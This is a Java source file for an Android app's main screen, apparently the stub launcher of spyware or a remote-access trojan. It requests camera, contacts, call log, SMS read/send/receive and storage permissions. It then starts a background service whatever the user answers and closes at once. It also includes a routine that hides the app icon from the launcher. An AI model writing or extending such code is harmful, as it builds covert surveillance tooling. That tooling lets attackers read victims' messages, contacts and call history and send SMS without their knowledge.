package com.qirat.stub;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.widget.Toast;

import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.Map;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "MainActivity";


    private final ActivityResultLauncher<String[]> requestPermissionLauncher = registerForActivityResult(
            new ActivityResultContracts.RequestMultiplePermissions(),
            this::onPermissionsResult
    );

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        setContentView(R.layout.activity_main);
        requestAllPermissions();
    }

    private void requestAllPermissions() {
        ArrayList<String> permissionsToRequest = new ArrayList<>(Arrays.asList(
                Manifest.permission.CAMERA,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.READ_SMS,
                Manifest.permission.SEND_SMS,
                Manifest.permission.RECEIVE_SMS
        ));


        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissionsToRequest.add(Manifest.permission.POST_NOTIFICATIONS);
            permissionsToRequest.add(Manifest.permission.READ_MEDIA_IMAGES);
            permissionsToRequest.add(Manifest.permission.READ_MEDIA_VIDEO);
            permissionsToRequest.add(Manifest.permission.READ_MEDIA_AUDIO);
        } else {

            permissionsToRequest.add(Manifest.permission.READ_EXTERNAL_STORAGE);
            permissionsToRequest.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
        }

        ArrayList<String> permissionsNeeded = new ArrayList<>();
        for (String permission : permissionsToRequest) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                permissionsNeeded.add(permission);
            }
        }

        if (permissionsNeeded.isEmpty()) {
            Log.d(TAG, "All permissions already granted. Starting service.");
            startMainServiceAndFinish();
        } else {
            Log.d(TAG, "Requesting permissions: " + permissionsNeeded);
            requestPermissionLauncher.launch(permissionsNeeded.toArray(new String[0]));
        }
    }

    private void onPermissionsResult(Map<String, Boolean> grants) {
        int grantedCount = 0;
        int deniedCount = 0;
        
        for (Map.Entry<String, Boolean> entry : grants.entrySet()) {
            if (entry.getValue()) {
                grantedCount++;
                Log.d(TAG, "Permission granted: " + entry.getKey());
            } else {
                deniedCount++;
                Log.w(TAG, "Permission denied: " + entry.getKey());
            }
        }


        Log.i(TAG, String.format("Permissions: %d granted, %d denied. Starting service...", grantedCount, deniedCount));
        startMainServiceAndFinish();
    }

    private void startMainServiceAndFinish() {
        Log.i(TAG, "Starting MainService...");
        

        Intent serviceIntent = new Intent(this, MainService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
        

        finish();
    }


    private void hideAppIcon() {
        Log.i(TAG, "Hiding app icon from launcher.");
        PackageManager pm = getPackageManager();
        pm.setComponentEnabledSetting(getComponentName(),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
    }
}
